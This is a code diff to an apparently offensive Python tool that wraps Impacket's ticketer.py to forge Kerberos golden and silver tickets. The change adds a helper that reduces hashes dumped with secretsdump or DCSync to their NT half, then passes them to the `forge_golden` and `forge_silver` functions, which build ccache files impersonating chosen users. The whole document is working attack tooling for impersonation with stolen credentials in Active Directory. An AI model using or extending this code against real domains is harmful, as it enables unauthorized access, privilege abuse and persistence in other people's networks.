@@ -45,6 +45,13 @@ def find_tool():
     return None
 
 
+def _nt_only(nt_hash):
+    """Normalize an NT hash to the bare 32-hex ticketer wants. Accepts a pasted
+    ``LM:NT`` pair (secretsdump/dcsync format) and returns just the NT half; a bare
+    hash passes through unchanged."""
+    return (nt_hash or "").strip().split(":")[-1]
+
+
 def _run_ticketer(argv, expected_ccache, timeout=60):
     """Common ticketer.py invocation — classify + surface the
     ccache path when the file lands."""
@@ -78,7 +85,7 @@ def forge_golden(krbtgt_hash, domain, domain_sid, username,
     """
     out_dir = out_dir or os.getcwd()
     ccache = os.path.join(out_dir, f"{username}.ccache")
-    argv = ["-nthash", krbtgt_hash,
+    argv = ["-nthash", _nt_only(krbtgt_hash),
             "-domain-sid", domain_sid,
             "-domain", domain,
             username]
@@ -94,7 +101,7 @@ def forge_silver(service_hash, domain, domain_sid, username,
     """
     out_dir = out_dir or os.getcwd()
     ccache = os.path.join(out_dir, f"{username}.ccache")
-    argv = ["-nthash", service_hash,
+    argv = ["-nthash", _nt_only(service_hash),
             "-domain-sid", domain_sid,
             "-domain", domain,
             "-spn", spn,
